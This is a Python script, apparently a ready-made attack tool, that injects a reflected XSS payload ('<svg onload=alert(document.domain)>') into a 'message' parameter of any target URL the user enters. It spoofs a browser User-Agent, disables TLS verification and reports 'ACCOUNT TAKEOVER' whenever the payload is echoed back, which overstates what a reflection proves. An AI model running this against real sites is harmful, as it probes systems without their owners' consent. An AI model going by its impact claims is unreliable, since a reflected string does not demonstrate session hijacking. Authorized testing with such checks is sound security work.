import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = r"""
███████╗██╗   ██╗ █████╗ ███╗   ██╗███████╗███████╗ ██████╗
██╔════╝╚██╗ ██╔╝██╔══██╗████╗  ██║██╔════╝██╔════╝██╔════╝
███████╗ ╚████╔╝ ███████║██╔██╗ ██║███████╗█████╗  ██║     
╚════██║  ╚██╔╝  ██╔══██║██║╚██╗██║╚════██║██╔══╝  ██║     
███████║   ██║   ██║  ██║██║ ╚████║███████║███████╗╚██████╗
╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝ ╚═════╝

                Account Takeover via XSS
"""

def check_xss(url):
    payload = '<svg onload=alert(document.domain)>'

    if not url.startswith("http"):
        url = "http://" + url

    if "?" in url:
        target = f"{url}&message={payload}"
    else:
        target = f"{url}/home.jsp?isError=true&message={payload}"

    print(BANNER)
    print("[+] Target URL:")
    print(target)
    print("-" * 75)

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

    try:
        r = requests.get(
            target,
            headers=headers,
            timeout=15,
            verify=False,
            allow_redirects=True
        )

        body_match = payload in r.text
        status_ok = r.status_code == 200
        content_type = r.headers.get("Content-Type", "")

        if body_match and status_ok and "text/html" in content_type:
            print("🔥 STATUS   : VULNERABLE")
            print("⚠️  IMPACT  : ACCOUNT TAKEOVER")
            print("💥 VECTOR  : Reflected XSS (Session Hijacking)")
            print("✅ MATCH   : Payload reflected in response")
        else:
            print("❌ STATUS  : NOT VULNERABLE")
            print(f"ℹ️  Code    : {r.status_code}")
            print(f"ℹ️  Type    : {content_type}")

    except requests.exceptions.SSLError:
        print("❌ SSL ERROR: Try using http:// instead of https://")

    except requests.exceptions.RequestException as e:
        print(f"❌ REQUEST ERROR: {e}")

if __name__ == "__main__":
    target = input("Enter target URL (e.g. http://example.com): ").strip()
    check_xss(target)
